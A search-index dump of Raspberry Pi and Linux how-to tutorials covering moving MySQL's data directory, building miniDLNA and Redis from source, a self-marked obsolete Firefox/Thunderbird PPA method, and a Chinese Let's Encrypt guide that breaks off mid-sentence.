Rules"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#step-4-restarting-mysql","text":"The next step is to start MySQL, but if you do, you\u2019ll run into another error. This time, instead of an AppArmor issue, the error happens because the script mysql-systemd-start checks for the existence of either a directory, -d , or a symbolic link, -L , that matches two default paths. It fails if they\u2019re not found: /usr/share/mysql/mysql-systemd-start . . . if [ ! -d /var/lib/mysql ] && [ ! -L /var/lib/mysql ]; then echo \"MySQL data dir not found at /var/lib/mysql. Please create one.\" exit 1 fi if [ ! -d /var/lib/mysql/mysql ] && [ ! -L /var/lib/mysql/mysql ]; then echo \"MySQL system database not found. Please run mysql_install_db tool.\" exit 1 fi . . . Since we need these to start the server, we will create the minimal directory structure to pass the script\u2019s environment check. 1. sudo mkdir /var/lib/mysql/mysql -p Now we\u2019re ready to start MySQL. 1. sudo systemctl start mysql 2. sudo systemctl status mysql To make sure that the new data directory is indeed in use, start the MySQL monitor. 1. mysql -u root -p Look at the value for the data directory again: Output+----------------------------+ | @@datadir | +----------------------------+ | /mnt/volume-nyc1-01/mysql/ | +----------------------------+ 1 row in set (0.01 sec) Now that you\u2019ve restarted MySQL and confirmed that it\u2019s using the new location, take the opportunity to ensure that your database is fully functional. Once you\u2019ve verified the integrity of any existing data, you can remove the backup data directory: 1. sudo rm -Rf /var/lib/mysql.bak Restart MySQL one final time to be sure that it works as expected: 1. sudo systemctl restart mysql 2. sudo systemctl status mysql","title":"Step 4 \u2014 Restarting MySQL"},{"location":"RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/#conclusion","text":"In this tutorial, we\u2019ve moved MySQL\u2019s data directory to a new location and updated Ubuntu\u2019s AppArmor ACLs to accommodate the adjustment. Although we were using a Block Storage device, the instructions here should be suitable for redefining the location of the data directory regardless of the underlying technology. For more on managing MySQL\u2019s data directories, see these sections in the official MySQL documentation: The Mysql Data Directory Setting Up Multiple Data Directories \u539f\u6587\u94fe\u63a5\uff1a https://www.digitalocean.com/community/tutorials/how-to-move-a-mysql-data-directory-to-a-new-location-on-ubuntu-16-04","title":"Conclusion"},{"location":"RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/","text":"DLNA servers allow you to stream your media library on your HTPC server to any DLNA enabled client. DLNA enabled clients include Bluray players, XBOX 360, XBOX One, PS3, PS4 and some TVs. There are other DLNA servers out there for the Raspberry Pi. I was looking at MediaTomb but it consumes several hundred megabytes of RAM when it is in use. This it not ideal on the low spec Pi running Raspbian. I had trouble with miniDLNA 1.0.24 not displaying avi (Divx, XviD) files in its folder database, this bug has been patched and fixed so that avi files \u2013 at least the ones I tested \u2013 were accessible by my DLNA clients. I will assume you have already mounted a USB hard drive for this guide \u2013 here is my Properly Mount USB Storage on Raspberry Guide in case you do need to mount. You will be compiling miniDLNA for Raspbian from source, it only takes a few minutes. If you are trying to figure out which hardware would work best for you, consider reading the Pi benchmarks . Update \u2013 Now installs the latest miniDLNA The latest version of ReadyMedia miniDLNA in the Raspbian repos is ancient so we are going to compile miniDLNA (now ReadyMedia) from source on Raspbian. This should fix avi problems you may have had in the past like them not showing up in the library. Remove your old miniDLNA version sudo apt-get purge minidlna -y sudo apt-get remove minidlna sudo apt-get autoremove -y Make sure you have a source repository, default Raspbian does not include this, change wheezy to jessie if you know you are on jessie echo \"deb-src http://archive.raspbian.org/raspbian wheezy main contrib non-free\" | sudo tee -a /etc/apt/sources.list Update repositories so it will detect your new source repo sudo apt-get update Grab dependencies for building it from source sudo apt-get build-dep minidlna -y If you get any errors you can install the dependencies manually sudo apt-get install autopoint debhelper dh-autoreconf gcc libavutil-dev libavcodec-dev libavformat-dev libjpeg-dev libsqlite3-dev libexif-dev libid3tag0-dev libogg-dev libvorbis-dev libflac-dev -y Download the latest miniDLNA source wget http://sourceforge.net/projects/minidlna/files/latest/download?source=files -O minidlna.tar.gz SourceForge has some stability issues so here is a Dropbox mirror for 1.1.4 in case it is down wget https://www.dropbox.com/s/hhv7ee057plec7a/minidlna-1.1.4.tar.gz Unpack miniDLNA tar -xvf minidlna*.tar.gz Enter the miniDLNA directory cd minidlna* Configure, make and install miniDLNA, it will take 5 minutes. ./configure && sudo make && sudo make install Copy the default configuration file sudo cp minidlna.conf /etc/ Copy the startup daemon script to autostart ReadyMedia miniDLNA on boot sudo cp linux/minidlna.init.d.script /etc/init.d/minidlna Make the startup script executable sudo chmod +x /etc/init.d/minidlna Update rc to use the miniDLNA defaults sudo update-rc.d minidlna defaults Edit the configuration sudo nano /etc/minidlna.conf Edit the settings below to point to your media folders. This version of minidlna will give you multiple folders under Video. Before movies and TV would have been under separate categories, now movies and TV will both be under the category video. It will also show the folder structure of them instead of showing just the video files. Avi files will also show up and be streamable. inotify uses resources because it autoupdates your library, if you don't use inotify you will have to manually restart and reload the miniDLNA service The friendly name is how your miniDLNA server will show up to its streaming clients media_dir=V,/mnt/usbstorage/Movies media_dir=V,/mnt/usbstorage/TV media_dir=A,/mnt/usbstorage/Music media_dir=P,/mnt/usbstorage/Pictures # Names the DLNA server friendly_name=RasPi Media Server # Tells the DLNA to update the library when there are changes inotify=yes Ctrl+X, Y and Enter to save and exit Start the minidlna service sudo service minidlna start Now make sure miniDLNA starts on boot It will run on port 8200 so you can check how many media files it has indexed there sudo reboot Your Raspberry Pi DLNA server will now be accessible to stream media to your clients: PCs, XBOX, PS3, Phones, TVs and more. This will form part of my Ultimate Raspberry Pi Media Server guide, to make sure you don't miss it sign up for my mailing list to find out when it drops.","title":"Install Latest ReadyMedia miniDLNA Raspberry Pi"},{"location":"RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/","text":"Installing Redis on a Raspberry Pi for caching If you want to configure caching to speed up web apps you may want to run on your Raspberry Pi. Or, it could be that some web apps, even require caching for their stable operation. Whatever the case may be, caching could be a life saver, when installed and configured properly. In this article, I will show how I install Redis on my Raspberry Pis. First of all, we need to download the latest stable release of Redis. Prepare to download Redis source and build it on your Raspberry Pi. It may sound spooky complicated, but it's just as simple as running 3 Linux bash commands. First, go to your user's home directory cd ~ To download Redis, the following link doesn't take a version as a parameter. Therefore, just copy and paste the command. wget http://download.redis.io/redis-stable.tar.gz Unarchive the package you've just downloaded. tar xzf redis* Go inside the Redis folder cd redis* Now let's build Redis from sources on your Raspberry Pi with following commands. sudo make make test sudo make install PREFIX=/usr At this point, you've compiled Redis Now, let's install it to a folder accessible to all users Create a directory sudo mkdir /etc/redis Install Compiled Redis there sudo cp redis.conf /etc/redis/ It is time to clean-up cd .. Delete archive and folder with this command. sudo rm -Rf redis* Create a user without Home directory and without the possibility to login into your system. As you are going to run Redis as this user. sudo adduser --system --group --disabled-login redis --no-create-home --shell /bin/nologin --quiet Check the shadow file to see if Redis user were created. cat /etc/passwd | grep redis Edit the Redis configuration file to setup caching. sudo nano /etc/redis/redis.conf Use nano's CTRL+W function to search for the following entries. some are already set. But, there are still few values to set. For example, daemonize yes to run Redis as a Deamon. stop-writes-on-bgsave-error no , Redis stops on failure and requires a manual restart. Using this setting Redis will not stop on failure. maxmemory 70M , RAM is limited on a RaspberryPi, so 70 Mb is enough for most of my needs. If you need more memory, adjust this setting later. bind 127.0.0.1 port 6379 daemonize yes stop-writes-on-bgsave-error no rdbcompression yes maxmemory 50M maxmemory-policy allkeys-lru At this point, you can create a script to run your Redis server. Create a directory, this script will be executed from. sudo mkdir -p /var/run/redis Make Redis user the owner of this directory. sudo chown -R redis /var/run/redis Create the script. sudo nano /etc/init.d/redis-server Paste the following. #! /bin/sh ### BEGIN INIT INFO # Provides: redis-server # Required-Start: $syslog $remote_fs # Required-Stop: $syslog $remote_fs # Should-Start: $local_fs # Should-Stop: $local_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: redis-server - Persistent key-value db # Description: redis-server - Persistent key-value db ### END INIT INFO PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin DAEMON=/usr/bin/redis-server DAEMON_ARGS=/etc/redis/redis.conf NAME=redis-server DESC=redis-server RUNDIR=/var/run/redis PIDFILE=$RUNDIR/redis-server.pid test -x $DAEMON || exit 0 if [ -r /etc/default/$NAME ] then . /etc/default/$NAME fi . /lib/lsb/init-functions set -e case \"$1\" in start) echo -n \"Starting $DESC: \" mkdir -p $RUNDIR touch $PIDFILE chown redis:redis $RUNDIR $PIDFILE chmod 755 $RUNDIR if [ -n \"$ULIMIT\" ] then ulimit -n $ULIMIT fi if start-stop-daemon --start --quiet --umask 007 --pidfile $PIDFILE --chuid redis:redis --exec $DAEMON -- $DAEMON_ARGS then echo \"$NAME.\" else echo \"failed\" fi ;; stop) echo -n \"Stopping $DESC: \" if start-stop-daemon --stop --retry forever/TERM/1 --quiet --oknodo --pidfile $PIDFILE --exec $DAEMON then echo \"$NAME.\" else echo \"failed\" fi rm -f $PIDFILE sleep 1 ;; restart|force-reload) ${0} stop ${0} start ;; status) status_of_proc -p ${PIDFILE} ${DAEMON} ${NAME} ;; *) echo \"Usage: /etc/init.d/$NAME {start|stop|restart|force-reload|status}\" >&2 exit 1 ;; esac exit 0 Make this script executable. sudo chmod +x /etc/init.d/redis-server Add this script to be run as a command sudo update-rc.d redis-server defaults If everything set correctly, the Redis server could now be manipulated through this command sudo service redis-server restart Now you may see the results of your actions Check the redis-server -v Make sure it listening on 127.0.0.1 netstat -antp Make sure the Redis process is running as the redis user. ps aux | grep redis You may now enjoy your Redis caching server installation on your Raspberry Pi. (Optional) Installing PHPRedis If you are planning on using Redis as a cache driver for your web app running on PHP, you may want to install PHPRedis as well. Otherwise, this is completely optional. First, Install few needed packages sudo apt-get install libtool php7.0-dev or php-dev, if you are using php 5. Go to your user\u2019s home directory. cd ~ Clone (Download) from this repository, git clone https://github.com/phpredis/phpredis.git If this step doesn\u2019t work, please make sure you have GIT installed sudo apt-get install git Go to the downloaded directory. cd phpredis Get the branch for your PHP version. In my case, it is php 7. git checkout php7 git pull Now, phpize the files. phpize And start building it from sources. ./configure make clean make sudo make install After the installation is over, clean-up the user\u2019s home directory. cd .. rm -rf phpredis The following commands easier executed with root user. su Add few extensions echo \"extension=redis.so\" > /etc/php/7.0/mods-available/redis.ini ln -sf /etc/php/7.0/mods-available/redis.ini /etc/php/7.0/fpm/conf.d/20-redis.ini ln -sf /etc/php/7.0/mods-available/redis.ini /etc/php/7.0/cli/conf.d/20-redis.ini Exit from root user. exit Restart services service php7.0-fpm restart service nginx restart Now, you may enjoy your installation of PHPRedis.","title":"Install Redis on your Raspberry Pi"},{"location":"RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/#installing-redis-on-a-raspberry-pi-for-caching","text":"If you want to configure caching to speed up web apps you may want to run on your Raspberry Pi. Or, it could be that some web apps, even require caching for their stable operation. Whatever the case may be, caching could be a life saver, when installed and configured properly. In this article, I will show how I install Redis on my Raspberry Pis. First of all, we need to download the latest stable release of Redis. Prepare to download Redis source and build it on your Raspberry Pi. It may sound spooky complicated, but it's just as simple as running 3 Linux bash commands. First, go to your user's home directory cd ~ To download Redis, the following link doesn't take a version as a parameter. Therefore, just copy and paste the command. wget http://download.redis.io/redis-stable.tar.gz Unarchive the package you've just downloaded. tar xzf redis* Go inside the Redis folder cd redis* Now let's build Redis from sources on your Raspberry Pi with following commands. sudo make make test sudo make install PREFIX=/usr At this point, you've compiled Redis Now, let's install it to a folder accessible to all users Create a directory sudo mkdir /etc/redis Install Compiled Redis there sudo cp redis.conf /etc/redis/ It is time to clean-up cd .. Delete archive and folder with this command. sudo rm -Rf redis* Create a user without Home directory and without the possibility to login into your system. As you are going to run Redis as this user. sudo adduser --system --group --disabled-login redis --no-create-home --shell /bin/nologin --quiet Check the shadow file to see if Redis user were created. cat /etc/passwd | grep redis Edit the Redis configuration file to setup caching. sudo nano /etc/redis/redis.conf Use nano's CTRL+W function to search for the following entries. some are already set. But, there are still few values to set. For example, daemonize yes to run Redis as a Deamon. stop-writes-on-bgsave-error no , Redis stops on failure and requires a manual restart. Using this setting Redis will not stop on failure. maxmemory 70M , RAM is limited on a RaspberryPi, so 70 Mb is enough for most of my needs. If you need more memory, adjust this setting later. bind 127.0.0.1 port 6379 daemonize yes stop-writes-on-bgsave-error no rdbcompression yes maxmemory 50M maxmemory-policy allkeys-lru At this point, you can create a script to run your Redis server. Create a directory, this script will be executed from. sudo mkdir -p /var/run/redis Make Redis user the owner of this directory. sudo chown -R redis /var/run/redis Create the script. sudo nano /etc/init.d/redis-server Paste the following. #! /bin/sh ### BEGIN INIT INFO # Provides: redis-server # Required-Start: $syslog $remote_fs # Required-Stop: $syslog $remote_fs # Should-Start: $local_fs # Should-Stop: $local_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: redis-server - Persistent key-value db # Description: redis-server - Persistent key-value db ### END INIT INFO PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin DAEMON=/usr/bin/redis-server DAEMON_ARGS=/etc/redis/redis.conf NAME=redis-server DESC=redis-server RUNDIR=/var/run/redis PIDFILE=$RUNDIR/redis-server.pid test -x $DAEMON || exit 0 if [ -r /etc/default/$NAME ] then . /etc/default/$NAME fi . /lib/lsb/init-functions set -e case \"$1\" in start) echo -n \"Starting $DESC: \" mkdir -p $RUNDIR touch $PIDFILE chown redis:redis $RUNDIR $PIDFILE chmod 755 $RUNDIR if [ -n \"$ULIMIT\" ] then ulimit -n $ULIMIT fi if start-stop-daemon --start --quiet --umask 007 --pidfile $PIDFILE --chuid redis:redis --exec $DAEMON -- $DAEMON_ARGS then echo \"$NAME.\" else echo \"failed\" fi ;; stop) echo -n \"Stopping $DESC: \" if start-stop-daemon --stop --retry forever/TERM/1 --quiet --oknodo --pidfile $PIDFILE --exec $DAEMON then echo \"$NAME.\" else echo \"failed\" fi rm -f $PIDFILE sleep 1 ;; restart|force-reload) ${0} stop ${0} start ;; status) status_of_proc -p ${PIDFILE} ${DAEMON} ${NAME} ;; *) echo \"Usage: /etc/init.d/$NAME {start|stop|restart|force-reload|status}\" >&2 exit 1 ;; esac exit 0 Make this script executable. sudo chmod +x /etc/init.d/redis-server Add this script to be run as a command sudo update-rc.d redis-server defaults If everything set correctly, the Redis server could now be manipulated through this command sudo service redis-server restart Now you may see the results of your actions Check the redis-server -v Make sure it listening on 127.0.0.1 netstat -antp Make sure the Redis process is running as the redis user. ps aux | grep redis You may now enjoy your Redis caching server installation on your Raspberry Pi.","title":"Installing Redis on a Raspberry Pi for caching"},{"location":"RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/#optional-installing-phpredis","text":"If you are planning on using Redis as a cache driver for your web app running on PHP, you may want to install PHPRedis as well. Otherwise, this is completely optional. First, Install few needed packages sudo apt-get install libtool php7.0-dev or php-dev, if you are using php 5. Go to your user\u2019s home directory. cd ~ Clone (Download) from this repository, git clone https://github.com/phpredis/phpredis.git If this step doesn\u2019t work, please make sure you have GIT installed sudo apt-get install git Go to the downloaded directory. cd phpredis Get the branch for your PHP version. In my case, it is php 7. git checkout php7 git pull Now, phpize the files. phpize And start building it from sources. ./configure make clean make sudo make install After the installation is over, clean-up the user\u2019s home directory. cd .. rm -rf phpredis The following commands easier executed with root user. su Add few extensions echo \"extension=redis.so\" > /etc/php/7.0/mods-available/redis.ini ln -sf /etc/php/7.0/mods-available/redis.ini /etc/php/7.0/fpm/conf.d/20-redis.ini ln -sf /etc/php/7.0/mods-available/redis.ini /etc/php/7.0/cli/conf.d/20-redis.ini Exit from root user. exit Restart services service php7.0-fpm restart service nginx restart Now, you may enjoy your installation of PHPRedis.","title":"(Optional) Installing PHPRedis"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/","text":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/#latest-version-of-firefox-and-thunderbird-on-a-raspberry-pi-obsolete","text":"This is a way to get the latest version of Firefox and Thunderbird on your Raspberry Pi. THIS ONLY WORKS ON A RASPBERRY PI 2 OR 3 OR 3B+! EDIT: This doesn't work right now, I'm trying to find out why. EDIT: I found out why it doesn't work. There is an unfixed bug in recent versions of Firefox for armhf, to use this you will have to switch to a 64-bit kernel by using something like this . Install dirmngr: Code: Select all sudo apt install dirmngr Add the repository to your sources: Code: Select all echo \"deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox.list echo \"deb-src http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/firefox-source.list echo \"deb http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird.list echo \"deb-src http://ppa.launchpad.net/mozillateam/thunderbird-next/ubuntu trusty main\" | sudo tee /etc/apt/sources.list.d/thunderbird-source.list Install Firefox and Thunderbird: Code: Select all sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A6DCF7707EBC211F sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 9BDB3D89CE49EC21 sudo apt update && sudo apt install firefox thunderbird -y Firefox and Thunderbird should be installed! \u539f\u6587\u94fe\u63a5\uff1a https://forums.raspberrypi.com/viewtopic.php?t=150438","title":"Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete]"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/","text":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66 ============================ \u5f88\u65e9\u4e4b\u524d\u6211\u5c31\u5728\u5173\u6ce8 Let's Encrypt \u8fd9\u4e2a\u514d\u8d39\u3001\u81ea\u52a8\u5316\u3001\u5f00\u653e\u7684\u8bc1\u4e66\u7b7e\u53d1\u670d\u52a1\u3002\u5b83\u7531 ISRG\uff08Internet Security Research Group\uff0c\u4e92\u8054\u7f51\u5b89\u5168\u7814\u7a76\u5c0f\u7ec4\uff09\u63d0\u4f9b\u670d\u52a1\uff0c\u800c ISRG \u662f\u6765\u81ea\u4e8e\u7f8e\u56fd\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684\u4e00\u4e2a\u516c\u76ca\u7ec4\u7ec7\u3002Let's Encrypt \u5f97\u5230\u4e86 Mozilla\u3001Cisco\u3001Akamai\u3001Electronic Frontier Foundation \u548c Chrome \u7b49\u4f17\u591a\u516c\u53f8\u548c\u673a\u6784\u7684\u652f\u6301\uff0c\u53d1\u5c55\u5341\u5206\u8fc5\u731b\u3002 \u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u4e0d\u4f46\u514d\u8d39\uff0c\u8fd8\u975e\u5e38\u7b80\u5355\uff0c\u867d\u7136\u6bcf\u6b21\u53ea\u6709 90 \u5929\u7684\u6709\u6548\u671f\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u5b9a\u671f\u66f4\u65b0\uff0c\u914d\u597d\u4e4b\u540e\u4e00\u52b3\u6c38\u9038\u3002\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u89c2\u671b\uff0c\u6211\u4e5f\u6b63\u5f0f\u542f\u7528 Let's Encrypt \u8bc1\u4e66\u4e86\uff0c\u672c\u6587\u8bb0\u5f55\u672c\u7ad9\u7533\u8bf7\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u3002 \u6211\u6ca1\u6709\u4f7f\u7528 Let's Encrypt \u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u7533\u8bf7\u8bc1\u4e66\uff0c\u800c\u662f\u7528\u4e86 acme-tiny \u8fd9\u4e2a\u66f4\u4e3a\u5c0f\u5de7\u7684\u5f00\u6e90\u5de5\u5177\u3002\u4ee5\u4e0b\u5185\u5bb9\u57fa\u672c\u6309\u7167 acme-tiny \u7684\u8bf4\u660e\u6587\u6863\u5199\u7684\uff0c\u7701\u7565\u4e86\u4e00\u4e9b\u6211\u4e0d\u9700\u8981\u7684\u6b65\u9aa4\u3002 ACME \u5168\u79f0\u662f Automated Certificate Management Environment\uff0c\u76f4\u8bd1\u8fc7\u6765\u662f\u81ea\u52a8\u5316\u8bc1\u4e66\u7ba1\u7406\u73af\u5883\u7684\u610f\u601d\uff0cLet's Encrypt \u7684\u8bc1\u4e66\u7b7e\u53d1\u8fc7\u7a0b\u4f7f\u7528\u7684\u5c31\u662f ACME \u534f\u8bae\u3002\u6709\u5173 ACME \u534f\u8bae\u7684\u66f4\u591a\u8d44\u6599\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u4ed3\u5e93 \u627e\u5230\u3002 \u521b\u5efa\u5e10\u53f7 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u4f8b\u5982 ssl \uff0c\u7528\u6765\u5b58\u653e\u5404\u79cd\u4e34\u65f6\u6587\u4ef6\u548c\u6700\u540e\u7684\u8bc1\u4e66\u6587\u4ef6\u3002\u8fdb\u5165\u8fd9\u4e2a\u76ee\u5f55\uff0c\u521b\u5efa\u4e00\u4e2a RSA \u79c1\u94a5\u7528\u4e8e Let's Encrypt \u8bc6\u522b\u4f60\u7684\u8eab\u4efd\uff1a openssl genrsa 4096 > account.key \u521b\u5efa CSR \u6587\u4ef6 \u63a5\u7740\u5c31\u53ef\u4ee5\u751f\u6210 CSR\uff08Certificate Signing Request\uff0c\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\uff09\u6587\u4ef6\u4e86\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8fd8\u9700\u8981\u521b\u5efa\u57df\u540d\u79c1\u94a5\uff08\u4e00\u5b9a\u4e0d\u8981\u4f7f\u7528\u4e0a\u9762\u7684\u8d26\u6237\u79c1\u94a5\uff09\uff0c\u6839\u636e\u8bc1\u4e66\u4e0d\u540c\u7c7b\u578b\uff0c\u57df\u540d\u79c1\u94a5\u4e5f\u53ef\u4ee5\u9009\u62e9 RSA \u548c ECC \u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u3002\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u4e8c\u9009\u4e00\u3002 1\uff09\u521b\u5efa RSA \u79c1\u94a5\uff08\u517c\u5bb9\u6027\u597d\uff09\uff1a openssl genrsa 4096 > domain.key 2\uff09\u521b\u5efa ECC \u79c1\u94a5\uff08\u90e8\u5206\u8001\u65e7\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\u3002\u4f18\u70b9\u662f\u8bc1\u4e66\u4f53\u79ef\u5c0f\uff09\uff1a #secp256r1 openssl ecparam -genkey -name secp256r1 | openssl ec -out domain.key #secp384r1 openssl ecparam -genkey -name secp384r1 | openssl ec -out domain.key \u6709\u5173 ECC \u8bc1\u4e66\u7684\u66f4\u591a\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u8fd9\u91cc \u3002 \u6709\u4e86\u79c1\u94a5\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u751f\u6210 CSR \u6587\u4ef6\u4e86\u3002\u5728 CSR \u4e2d\u63a8\u8350\u81f3\u5c11\u628a\u57df\u540d\u5e26 www \u548c\u4e0d\u5e26 www \u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u52a0\u8fdb\u53bb\uff0c\u5176\u5b83\u5b50\u57df\u53ef\u4ee5\u6839\u636e\u9700\u8981\u6dfb\u52a0\uff08\u76ee\u524d\u4e00\u5f20\u8bc1\u4e66\u6700\u591a\u53ef\u4ee5\u5305\u542b 100 \u4e2a\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr \u6267\u884c\u8fd9\u4e00\u6b65\u65f6\uff0c\u5982\u679c\u63d0\u793a\u627e\u4e0d\u5230 /etc/ssl/openssl.cnf \u6587\u4ef6\uff0c\u8bf7\u770b\u770b /usr/local/openssl/ssl/openssl.cnf \u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ea4\u4e92\u65b9\u5f0f\u521b\u5efa CSR\uff08\u9700\u8981\u6ce8\u610f Common Name \u5fc5\u987b\u4e3a\u4f60\u7684\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -out domain.csr \u914d\u7f6e\u9a8c\u8bc1\u670d\u52a1 \u6211\u4eec\u77e5\u9053\uff0cCA \u5728\u7b7e\u53d1 DV\uff08Domain Validation\uff09\u8bc1\u4e66\u65f6\uff0c\u9700\u8981\u9a8c\u8bc1\u57df\u540d\u6240\u6709\u6743\u3002\u4f20\u7edf CA \u7684\u9a8c\u8bc1\u65b9\u5f0f\u4e00\u822c\u662f\u5f80 admin@yoursite.com \u53d1\u9a8c\u8bc1\u90ae\u4ef6\uff0c\u800c Let's Encrypt \u662f\u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u9a8c\u8bc1\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u521b\u5efa CSR \u65f6\u6307\u5b9a\u7684\u57df\u540d\u8bbf\u95ee\uff0c\u5982\u679c\u53ef\u4ee5\u8bbf\u95ee\u5219\u8868\u660e\u4f60\u5bf9\u8fd9\u4e2a\u57df\u540d\u6709\u63a7\u5236\u6743\u3002 \u9996\u5148\u521b\u5efa\u7528\u4e8e\u5b58\u653e\u9a8c\u8bc1\u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u4f8b\u5982\uff1a mkdir ~/www/challenges/ \u7136\u540e\u914d\u7f6e\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u4ee5 Nginx \u4e3a\u4f8b\uff1a server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } \u4ee5\u4e0a\u914d\u7f6e\u4f18\u5148\u67e5\u627e ~/www/challenges/ \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u91cd\u5b9a\u5411\u5230 HTTPS \u5730\u5740\u3002\u8fd9\u4e2a\u9a8c\u8bc1\u670d\u52a1\u4ee5\u540e\u66f4\u65b0\u8bc1\u4e66\u8fd8\u8981\u7528\u5230\uff0c\u5efa\u8bae\u4e00\u76f4\u4fdd\u7559\u3002 \u83b7\u53d6\u7f51\u7ad9\u8bc1\u4e66 \u5148\u628a acme-tiny \u811a\u672c\u4fdd\u5b58\u5230\u4e4b\u524d\u7684 ssl \u76ee\u5f55\uff1a wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py \u6307\u5b9a\u8d26\u6237\u79c1\u94a5\u3001CSR \u4ee5\u53ca\u9a8c\u8bc1\u76ee\u5f55\uff0c\u6267\u884c\u811a\u672c\uff1a python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir ~/www/challenges/ > ./signed.crt \u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a signed.crt \uff0c\u8fd9\u5c31\u662f\u7533\u8bf7\u597d\u7684\u8bc1\u4e66\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u628a\u57df\u540d DNS \u89e3\u6790\u653e\u5728\u56fd\u5185\uff0c\u8fd9\u4e00\u6b65\u5f88\u53ef\u80fd\u4f1a\u9047\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u9519\u8bef\uff1a ValueError: Wrote file to 